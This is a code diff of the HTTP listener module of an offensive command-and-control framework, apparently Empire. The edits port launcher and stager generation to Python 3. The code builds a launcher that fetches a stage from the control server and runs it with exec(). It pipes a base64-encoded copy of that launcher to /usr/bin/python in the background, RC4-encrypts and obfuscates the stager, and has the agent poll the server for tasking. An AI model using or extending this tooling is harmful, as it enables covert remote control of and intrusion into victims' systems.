@@ -448,11 +448,9 @@ class Listener(object):
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON',
                                                              meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
                 
                 launcherBase += "req=urllib2.Request(server+t);\n"
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -461,23 +459,31 @@ class Listener(object):
                         headerValue = header.split(':')[1]
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
-                
+
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
                         launcherBase += "proxy = urllib2.ProxyHandler();\n"
                     else:
                         proto = proxy.split(':')[0]
                         launcherBase += "proxy = urllib2.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
-                    
+
                     if proxyCreds != "none":
                         if proxyCreds == "default":
                             launcherBase += "o = urllib2.build_opener(proxy);\n"
+
+                            # add the RC4 packet to a cookie
+                            launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
+                            b64RoutingPacket)
                         else:
                             launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'" + proxy + "','" + username + "','" + password + "');\n"
                             launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+
+                            # add the RC4 packet to a cookie
+                            launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
+                            b64RoutingPacket)
                     else:
                         launcherBase += "o = urllib2.build_opener(proxy);\n"
                 else:
@@ -507,7 +513,7 @@ class Listener(object):
                 launcherBase += "exec(''.join(out))"
                 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                     launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (
                         launchEncoded)
                     return launcher
@@ -627,17 +633,18 @@ class Listener(object):
                 'stage_1': stage1,
                 'stage_2': stage2
             }
-            
+
             stager = template.render(template_options)
             stager = obfuscation.py_minify(stager)
-            
+
             # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
             if encrypt:
                 # return an encrypted version of the stager ("normal" staging)
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
+
+                return RC4IV + encryption.rc4(RC4IV + stagingKey.encode('UTF-8'), stager.encode('UTF-8'))
             else:
                 # otherwise return the standard stager
                 return stager
@@ -837,14 +844,12 @@ class Listener(object):
                 
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
-                print('listeners/http.py: line 851')
                 sendMessage = """
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
-
     global missedCheckins
     global server
     global headers
